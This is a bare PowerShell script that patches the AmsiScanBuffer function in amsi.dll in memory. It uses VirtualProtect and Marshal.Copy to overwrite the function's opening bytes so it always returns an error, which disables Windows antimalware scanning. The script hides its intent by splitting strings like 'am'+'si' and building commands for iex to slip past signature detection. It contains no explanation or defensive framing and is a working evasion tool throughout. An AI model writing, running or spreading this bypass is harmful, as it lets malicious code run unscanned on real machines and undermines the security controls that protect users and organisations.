$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

$me1 = 'Add-'
$me2 = 'Type '
$me3 = '$Win32'

iex ($me1 + $me2 + $me3)

$LoadLibrary = [Win32]::LoadLibrary("am" + "si" + ".dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$bit1 = '0xB8'
$bit2 = '0x57'
$bit3 = '0x00'
$bit4 = '0x07'
$bit5 = '0x80'
$bit6 = '0xC3'

$Patch = [Byte[]] ($bit1, $bit2, $bit3, $bit4, $bit5, $bit6)

$blah1 = '[System.Runtime.InteropServices.Marshal]::'
$blah2 = 'Copy($Patch,'
$blah3 = ' 0, $Address, 6)'
iex ($blah1 + $blah2 + $blah3)